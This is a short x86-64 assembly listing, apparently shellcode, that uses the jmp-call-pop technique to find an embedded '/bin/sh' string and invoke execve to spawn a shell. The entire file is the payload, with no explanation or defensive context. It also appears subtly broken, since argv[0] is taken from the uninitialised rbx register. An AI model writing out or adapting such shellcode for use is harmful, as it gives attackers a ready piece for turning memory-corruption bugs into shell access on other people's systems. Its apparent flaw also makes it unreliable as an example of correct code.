section .data
global _start
_start:
  jmp En
St:
  xor eax, eax
  pop rdi
  mov [rdi+7], al
  lea rsi, [rdi+8]
  lea rdx, [rdi+16]
  mov [rsi], rbx
  mov [rdx], rax
  mov al, 59
  syscall
En:
  call St
  db '/bin/sh',0xa
